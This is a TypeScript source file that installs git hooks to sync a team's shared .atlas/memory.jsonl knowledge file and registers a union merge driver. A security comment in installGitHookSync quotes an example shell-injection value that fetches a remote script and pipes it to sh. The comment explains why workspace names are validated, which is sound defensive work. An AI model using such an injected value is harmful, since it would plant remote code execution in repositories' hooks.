/**
 * cli/gitHooks.ts — installs/removes the git hooks that make Groundfloor Atlas's
 * developer-to-developer knowledge sync fully automatic:
 *
 *   - pre-commit  — exports + force-stages `.atlas/memory.jsonl` on every commit.
 *   - post-merge / post-checkout — imports it back after every pull/clone/checkout
 *     (either can be how a teammate picks up new commits, so both are installed).
 *
 * Shared by `atlas hook install` (cli.ts, manual) and `atlas wire` (wire.ts,
 * the IDE-install step) — so wiring a project into an IDE also wires up git-
 * based memory sync in the SAME one-shot command, not a separate manual step.
 *
 * RD-hooks-path — the hooks directory is NOT always `<repo>/.git/hooks`.
 * `core.hooksPath` (settable globally, e.g. by Husky/Lefthook/pre-commit, or
 * simply a developer's own personal git config) redirects git to look
 * elsewhere — confirmed in practice on this machine (`core.hooksPath` in
 * `~/.gitconfig` points at a directory shared across EVERY repo). Writing to
 * `.git/hooks/` directly in that case installs a file git never reads —
 * looked like it worked (no error) but silently never ran. The only correct
 * way to know where git will actually look is to ask git itself
 * (`git rev-parse --git-path hooks`), which resolves whatever is really in
 * effect (repo-local override, global override, or the `.git/hooks` default).
 *
 * A resolved hooks path can therefore be SHARED across multiple unrelated
 * repos. A hook file there must not run Atlas's export/import unconditionally
 * — that would fire for every commit on the machine, in every repo, trying
 * to sync a workspace/`.atlas/memory.jsonl` that has nothing to do with
 * whatever repo the commit is actually in. Every generated section is
 * therefore keyed to and guarded by the specific repo it was installed for
 * (git always invokes hooks with cwd = that repo's top-level directory, so a
 * `$(pwd)` comparison reliably identifies "is this commit in MY repo"), and
 * markers are per-repo (`# atlas-hook-begin:<repoRoot>`) so several different
 * projects' sections can coexist in one shared hook file without clobbering
 * each other on install/uninstall/status.
 *
 * All sections are idempotent and never block the git operation they're
 * attached to — export/import failures are swallowed (`|| true`) rather than
 * failing a commit or a pull.
 */

import * as fs from 'node:fs';
import * as path from 'node:path';
import { execFile, execFileSync } from 'node:child_process';
import { promisify } from 'node:util';

const execFileAsync = promisify(execFile);

const SYNCED_HOOKS = ['pre-commit', 'post-merge', 'post-checkout'] as const;
type SyncedHook = (typeof SYNCED_HOOKS)[number];

/** Workspace slug rule — identical to wire.ts's WORKSPACE_SLUG_RE. Enforced
 *  in installGitHookSync (the sink every hook-install path funnels through). */
const WORKSPACE_SLUG_RE = /^[a-z0-9][a-z0-9-]*$/;

function markerBegin(repoRoot: string): string { return `# atlas-hook-begin:${repoRoot}`; }
function markerEnd(repoRoot: string): string { return `# atlas-hook-end:${repoRoot}`; }

/**
 * Derive the Atlas install root from argv[1]. Under BOTH invocation modes —
 * tsx dev (`<atlasDir>/src/cli.ts`) and the compiled build
 * (`<atlasDir>/dist/cli.js`) — argv[1] sits exactly two path segments below
 * atlasDir, so two dirname() calls land on atlasDir either way. Goes through
 * bin/atlas (not a hardcoded node+tsx+cli.ts invocation) so hooks keep
 * working unchanged whether this machine runs Atlas from source or a
 * compiled dist/ — bin/atlas already picks whichever exists.
 */
/** Absolute path to the pure-JSONL union merge driver script. Resolved the same
 *  way as resolveAtlasBin so it works from both src (tsx) and compiled dist. */
function resolveMergeDriverScript(): string {
    const argv1 = process.argv[1] ?? '';
    const atlasDir = path.resolve(path.dirname(path.dirname(argv1)));
    return path.join(atlasDir, 'scripts', 'memory-merge-driver.mjs');
}

const MERGE_DRIVER = 'atlas-memory-union';
const GITATTR_BEGIN = '# atlas-memory-merge-begin';
const GITATTR_END = '# atlas-memory-merge-end';

/**
 * Register a git merge driver that UNIONs .atlas/memory.jsonl by entry id, so a
 * conflicting merge is resolved without dropping either side's knowledge (the
 * bug where post-merge import was skipped and pre-commit export then clobbered
 * the resolved union). Repo-local git config + a marked .gitattributes stanza;
 * both idempotent. Best-effort — returns false (never throws) if git config
 * fails, since the hooks still work without it.
 */
function installMergeDriver(repoRoot: string): boolean {
    try {
        const driver = resolveMergeDriverScript();
        execFileSync('git', ['config', `merge.${MERGE_DRIVER}.name`, 'Union .atlas/memory.jsonl by entry id'], { cwd: repoRoot });
        execFileSync('git', ['config', `merge.${MERGE_DRIVER}.driver`, `node "${driver}" %O %A %B`], { cwd: repoRoot });

        const attrFile = path.join(repoRoot, '.gitattributes');
        const existing = fs.existsSync(attrFile) ? fs.readFileSync(attrFile, 'utf8') : '';
        if (!existing.includes(GITATTR_BEGIN)) {
            const stanza = `${GITATTR_BEGIN}\n.atlas/memory.jsonl merge=${MERGE_DRIVER}\n${GITATTR_END}\n`;
            const next = existing ? existing.trimEnd() + '\n\n' + stanza : stanza;
            fs.writeFileSync(attrFile, next);
        }
        return true;
    } catch {
        return false;
    }
}

function uninstallMergeDriver(repoRoot: string): void {
    try {
        execFileSync('git', ['config', '--remove-section', `merge.${MERGE_DRIVER}`], { cwd: repoRoot });
    } catch { /* section may not exist */ }
    try {
        const attrFile = path.join(repoRoot, '.gitattributes');
        if (fs.existsSync(attrFile)) {
            const cleaned = fs.readFileSync(attrFile, 'utf8')
                .replace(new RegExp(`\\n*${escapeRe(GITATTR_BEGIN)}[\\s\\S]*?${escapeRe(GITATTR_END)}\\n*`, 'g'), '\n')
                .trimEnd();
            if (cleaned) fs.writeFileSync(attrFile, cleaned + '\n');
            else fs.rmSync(attrFile);
        }
    } catch { /* best-effort */ }
}

function resolveAtlasBin(): string {
    const argv1 = process.argv[1] ?? '';
    const atlasDir = path.resolve(path.dirname(path.dirname(argv1)));
    return path.join(atlasDir, 'bin', 'atlas');
}

/** The repo's canonical top-level directory — what `$(pwd)` will equal
 *  whenever git invokes a hook for THIS repo, regardless of which
 *  subdirectory `projectDir` pointed at. Null if not inside a git repo. */
function resolveRepoRoot(projectDir: string): string | null {
    try {
        return execFileSync('git', ['rev-parse', '--show-toplevel'], { cwd: projectDir, encoding: 'utf8' }).trim();
    } catch {
        return null;
    }
}

/** The hooks directory git will ACTUALLY use for this repo — respects
 *  `core.hooksPath` (repo-local or global), not just the `.git/hooks`
 *  default. Null if not inside a git repo (or git isn't on PATH). */
function resolveGitHooksDir(projectDir: string): string | null {
    try {
        const out = execFileSync('git', ['rev-parse', '--git-path', 'hooks'], { cwd: projectDir, encoding: 'utf8' }).trim();
        return path.resolve(projectDir, out);
    } catch {
        return null;
    }
}

// Exported for tests/memory-two-writer.test.ts (scenario 6) — asserts the
// pre-commit body keeps `--union` + `git add -f` so a future edit can't silently
// drop the merge-safety flag. No behavior change.
export function buildExportHookSection(repoRoot: string, workspace: string): string {
    const atlasBin = resolveAtlasBin();
    return [
        markerBegin(repoRoot),
        // Guard: this hooks dir may be SHARED across other repos (core.hooksPath)
        // — only run for a commit actually happening in THIS repo.
        `if [ "$(pwd)" = "${repoRoot}" ]; then`,
        // -f (force) — a repo may reasonably .gitignore the rest of .atlas/ (a
        // machine-local index checkpoint) while still wanting THIS one file
        // tracked; a plain `git add` silently no-ops on a gitignored path.
        // Bake the workspace in explicitly — omitting it would fall back to
        // whatever generic default the CLI resolves to, silently exporting the
        // WRONG project's knowledge (or an empty one) into every commit.
        //
        // --union (W1 merge-safety): fold any entry already in the working-tree
        // .atlas/memory.jsonl but not yet in the local DB (a teammate's/the PM's
        // pull whose post-merge import was skipped or ABI-broke) back into the
        // fresh export, so committing can never clobber remote-only knowledge.
        `  ("${atlasBin}" memory export .atlas/memory.jsonl --workspace "${workspace}" --union 2>/dev/null \\`,
        `    && git add -f .atlas/memory.jsonl 2>/dev/null) || true`,
        // Developer-facing nudge (flag, NEVER block): after the ledger is fresh,
        // warn about work with no approved change request and point to the PM.
        // Silent when clean; suppressed by ATLAS_NO_NUDGE; `|| true` so it can
        // never fail a commit. Reads the JSONL directly (no daemon/native deps).
        `  ("${atlasBin}" memory flag .atlas/memory.jsonl --nudge 2>&1 || true)`,
        'fi',
        markerEnd(repoRoot),
    ].join('\n');
}

function buildImportHookSection(repoRoot: string, workspace: string): string {
    const atlasBin = resolveAtlasBin();
    return [
        markerBegin(repoRoot),
        `if [ "$(pwd)" = "${repoRoot}" ]; then`,
        // Only attempts the import when the exported file actually exists (a
        // repo that hasn't shared any knowledge yet has nothing to import).
        // Import is idempotent (upsert by id), so post-checkout firing on
        // every ordinary branch switch — not just a fresh clone — is harmless.
        `  [ -f .atlas/memory.jsonl ] && ("${atlasBin}" memory import .atlas/memory.jsonl --workspace "${workspace}" 2>/dev/null || true)`,
        'fi',
        markerEnd(repoRoot),
    ].join('\n');
}

function sectionFor(hookName: SyncedHook, repoRoot: string, workspace: string): string {
    return hookName === 'pre-commit' ? buildExportHookSection(repoRoot, workspace) : buildImportHookSection(repoRoot, workspace);
}

/**
 * Install (or refresh) THIS repo's Atlas section into one hook file. Other
 * repos' sections (if the hooks dir is shared) are left completely alone.
 * Returns true if this call WROTE the file (a new section, or a refresh of a
 * stale one); false only when this repo's section was already byte-identical
 * (idempotent no-op).
 *
 * W1-T3 — refresh, don't no-op: a repo wired before the `--union` pre-commit
 * body existed would otherwise keep the unsafe hook forever, since re-running
 * `wire install` used to bail the moment the marker was present. Now, when the
 * marker exists but the body differs, we splice-replace THIS repo's marked
 * block in place (matched by its per-repo markers, so a shared core.hooksPath
 * file's other sections are untouched).
 */
function installMarkerSection(hookFile: string, repoRoot: string, section: string): boolean {
    const existing = fs.existsSync(hookFile) ? fs.readFileSync(hookFile, 'utf8') : '';
    if (existing.includes(markerBegin(repoRoot))) {
        const begin = escapeRe(markerBegin(repoRoot));
        const end = escapeRe(markerEnd(repoRoot));
        // Non-greedy: markers embed repoRoot, so exactly one block matches THIS
        // repo; other repos' sections have different markerBegin strings.
        const blockRe = new RegExp(`${begin}[\\s\\S]*?${end}`);
        const current = existing.match(blockRe)?.[0];
        if (current === section) return false; // already current — true no-op
        // The trailing newline after the block (written by the append branch
        // below on first install) sits OUTSIDE the match, so replacing the block
        // with `section` preserves surrounding content and spacing exactly.
        fs.writeFileSync(hookFile, existing.replace(blockRe, section), { mode: 0o755 });
        return true;
    }
    // No trailing `exit 0` on the fresh-file branch — the section itself is
    // an `if`/`fi` block ending in `|| true` inside it (always succeeds), and
    // a shell script with no explicit `exit` just exits with its last
    // command's status anyway. A hardcoded `exit 0` line here would become
    // permanent file content: on a later uninstall+reinstall, that leftover
    // line is indistinguishable from user content, so it lands in `existing`
    // and gets treated as "content to append after" — meaning the freshly-
    // appended section would sit AFTER an `exit 0` that already terminated
    // the script, making it dead code that silently never runs again.
    const content = existing
        ? existing.trimEnd() + '\n\n' + section + '\n'
        : `#!/bin/sh\n${section}\n`;
    fs.writeFileSync(hookFile, content, { mode: 0o755 });
    return true;
}

/** Removes only THIS repo's section; any other repos' sections in a shared
 *  hook file are untouched. */
function uninstallMarkerSection(hookFile: string, repoRoot: string): boolean {
    if (!fs.existsSync(hookFile)) return false;
    const content = fs.readFileSync(hookFile, 'utf8');
    if (!content.includes(markerBegin(repoRoot))) return false;
    const begin = escapeRe(markerBegin(repoRoot));
    const end = escapeRe(markerEnd(repoRoot));
    const cleaned = content
        .replace(new RegExp(`\n*${begin}[\\s\\S]*?${end}\n*`, 'g'), '\n')
        .trimEnd() + '\n';
    fs.writeFileSync(hookFile, cleaned, { mode: 0o755 });
    return true;
}

function markerSectionStatus(hookFile: string, repoRoot: string): 'installed' | 'absent' | 'no-hook-file' {
    if (!fs.existsSync(hookFile)) return 'no-hook-file';
    const content = fs.readFileSync(hookFile, 'utf8');
    return content.includes(markerBegin(repoRoot)) ? 'installed' : 'absent';
}

function escapeRe(s: string): string {
    return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

export interface CatchUpImportResult {
    /** false = no .atlas/memory.jsonl existed yet, so nothing to do (normal
     *  for the FIRST-ever wire in a repo, before anyone has committed one). */
    attempted: boolean;
    ok?: boolean;
    detail?: string;
}

/**
 * One-time catch-up import, run right after installing the hooks.
 *
 * Why this is needed: a teammate's fresh `git clone` already contains
 * `.atlas/memory.jsonl` if the repo owner turned sync on — but it arrived
 * BEFORE this teammate's own post-merge/post-checkout hooks existed (hooks
 * are never part of a clone; git's actual hooks dir — see RD-hooks-path
 * above — is always local-only). Git already ran its own post-checkout for
 * the clone's implicit initial checkout, and that can't be re-triggered
 * retroactively now that the hook exists. Without this, the content would
 * sit stranded until the teammate's NEXT pull — which might be a while.
 * Importing immediately here closes that gap: from this point on, every REAL
 * pull/checkout is what keeps it current.
 */
async function runCatchUpImport(projectDir: string, workspace: string): Promise<CatchUpImportResult> {
    const memoryFile = path.join(path.resolve(projectDir), '.atlas', 'memory.jsonl');
    if (!fs.existsSync(memoryFile)) return { attempted: false };
    const atlasBin = resolveAtlasBin();
    try {
        const { stdout } = await execFileAsync(atlasBin, ['memory', 'import', memoryFile, '--workspace', workspace], { timeout: 30_000 });
        // `atlas memory import` prints exactly one JSON line — but be
        // defensive about any stray log noise sharing stdout.
        const jsonLine = stdout.trim().split('\n').reverse().find((l) => l.trim().startsWith('{'));
        const parsed = jsonLine ? (JSON.parse(jsonLine) as { ok?: boolean; nodeCount?: number; errorCount?: number }) : {};
        return { attempted: true, ok: parsed.ok !== false, detail: `nodeCount=${parsed.nodeCount ?? 0} errorCount=${parsed.errorCount ?? 0}` };
    } catch (err) {
        // Best-effort — a failed catch-up doesn't fail the whole install; the
        // next real pull/checkout will try again via the hook itself.
        return { attempted: true, ok: false, detail: (err as Error).message };
    }
}

export interface GitHookSyncResult {
    ok: boolean;
    error?: string;
    workspace?: string;
    hooksDir?: string;
    /** hookName -> true if THIS call newly installed it, false if already present. */
    installed?: Record<SyncedHook, boolean>;
    /** true if the .atlas/memory.jsonl union merge driver was registered. */
    mergeDriver?: boolean;
    catchUpImport?: CatchUpImportResult;
}

/** Not resolvable as a git repo → caller decides whether that's fatal
 *  (`atlas hook install`, standalone) or a silent skip (`atlas wire`, which
 *  is also useful for a project that isn't a git repo yet). */
export function isGitRepo(projectDir: string): boolean {
    return resolveGitHooksDir(projectDir) !== null;
}

export async function installGitHookSync(projectDir: string, workspace: string): Promise<GitHookSyncResult> {
    // SHELL-INJECTION CHOKE POINT — `workspace` is interpolated into 0755
    // /bin/sh hook scripts below (`--workspace "${workspace}"`) that run on
    // every commit/merge/checkout. wire.ts validates this at ITS entry point,
    // but `atlas hook install --workspace` reaches this same sink unchecked —
    // a value like `x";curl evil|sh;"` would bake RCE into the repo's hooks.
    // Enforce the slug rule HERE, in the sink, so no present or future caller
    // can bypass it. Same rule as wire.ts's WORKSPACE_SLUG_RE.
    if (!WORKSPACE_SLUG_RE.test(workspace)) {
        return {
            ok: false,
            error: `invalid workspace name ${JSON.stringify(workspace)} — use lowercase letters, numbers, and hyphens only ` +
                `(it is embedded in git hook shell scripts, so anything else is a shell-injection risk)`,
        };
    }
    const repoRoot = resolveRepoRoot(projectDir);
    const hooksDir = resolveGitHooksDir(projectDir);
    if (!repoRoot || !hooksDir) {
        return { ok: false, error: `not a git repo (or git not on PATH): ${path.resolve(projectDir)}` };
    }
    // The resolved dir may be a SHARED, machine-wide path (core.hooksPath)
    // that doesn't exist yet for a fresh checkout — create it rather than
    // assuming `.git/hooks` (which git already guarantees exists). A
    // core.hooksPath pointing somewhere the user can't write (or a read-only
    // parent) surfaces as an actionable error instead of an uncaught throw out
    // of `wire install`.
    try {
        fs.mkdirSync(hooksDir, { recursive: true });
    } catch (err) {
        return { ok: false, error: `cannot create git hooks dir ${hooksDir} (core.hooksPath?): ${(err as Error).message}` };
    }
    const installed = {} as Record<SyncedHook, boolean>;
    for (const name of SYNCED_HOOKS) {
        installed[name] = installMarkerSection(path.join(hooksDir, name), repoRoot, sectionFor(name, repoRoot, workspace));
    }
    // Union merge driver so a conflicting merge of .atlas/memory.jsonl resolves
    // by unioning both sides instead of silently dropping remote-only entries.
    const mergeDriver = installMergeDriver(repoRoot);
    const catchUpImport = await runCatchUpImport(projectDir, workspace);
    return { ok: true, workspace, hooksDir, installed, mergeDriver, catchUpImport };
}

export interface MergeDriverOnlyResult {
    ok: boolean;
    error?: string;
    repoRoot?: string;
    /** true if the union merge driver + .gitattributes stanza were registered
     *  (idempotent — false only when git config failed). */
    mergeDriver?: boolean;
}

/**
 * W3-T2 — install ONLY the union merge driver + `.gitattributes` stanza, and
 * nothing else. This is what a NON-ATLAS git participant needs — most importantly
 * the PM digital employee's clone, which has no embedded Lore and therefore must
 * NOT get the export/import hooks (there is no DB to export from), but MUST get
 * the union driver or its `git pull --rebase` on a conflicted `.atlas/memory.jsonl`
 * regresses to raw text-conflict behavior and can drop a side's knowledge.
 *
 * Deliberately does NOT call installMarkerSection / runCatchUpImport — no hooks,
 * no import. Resolves the driver script the same way installGitHookSync does
 * (resolveMergeDriverScript → works from both tsx-src and compiled dist).
 * Zero-native-deps like the rest of the memory surface (git + fs only).
 */
export function installMergeDriverOnly(projectDir: string): MergeDriverOnlyResult {
    const repoRoot = resolveRepoRoot(projectDir);
    if (!repoRoot) {
        return { ok: false, error: `not a git repo (or git not on PATH): ${path.resolve(projectDir)}` };
    }
    const mergeDriver = installMergeDriver(repoRoot);
    return { ok: mergeDriver, repoRoot, mergeDriver, ...(mergeDriver ? {} : { error: 'git config for the union merge driver failed' }) };
}

/**
 * W3-T2 — remove ONLY the union merge driver + `.gitattributes` stanza (the
 * counterpart to installMergeDriverOnly). Leaves any Atlas hook sections alone
 * (a driver-only clone has none). Idempotent.
 */
export function uninstallMergeDriverOnly(projectDir: string): MergeDriverOnlyResult {
    const repoRoot = resolveRepoRoot(projectDir);
    if (!repoRoot) return { ok: true };
    uninstallMergeDriver(repoRoot);
    return { ok: true, repoRoot, mergeDriver: false };
}

/** W3-T2 — is the union merge driver registered in this repo's git config? */
export function mergeDriverStatus(projectDir: string): boolean {
    const repoRoot = resolveRepoRoot(projectDir);
    if (!repoRoot) return false;
    try {
        const out = execFileSync('git', ['config', '--get', `merge.${MERGE_DRIVER}.driver`], { cwd: repoRoot, encoding: 'utf8' }).trim();
        return out.length > 0;
    } catch {
        return false;
    }
}

export function uninstallGitHookSync(projectDir: string): GitHookSyncResult {
    const repoRoot = resolveRepoRoot(projectDir);
    const hooksDir = resolveGitHooksDir(projectDir);
    if (!repoRoot || !hooksDir) return { ok: true, installed: {} as Record<SyncedHook, boolean> };
    const installed = {} as Record<SyncedHook, boolean>;
    for (const name of SYNCED_HOOKS) {
        installed[name] = uninstallMarkerSection(path.join(hooksDir, name), repoRoot);
    }
    uninstallMergeDriver(repoRoot);
    return { ok: true, hooksDir, installed };
}

export function gitHookSyncStatus(projectDir: string): Record<SyncedHook, string> {
    const repoRoot = resolveRepoRoot(projectDir);
    const hooksDir = resolveGitHooksDir(projectDir);
    const out = {} as Record<SyncedHook, string>;
    for (const name of SYNCED_HOOKS) {
        out[name] = (repoRoot && hooksDir) ? markerSectionStatus(path.join(hooksDir, name), repoRoot) : 'no-hook-file';
    }
    return out;
}
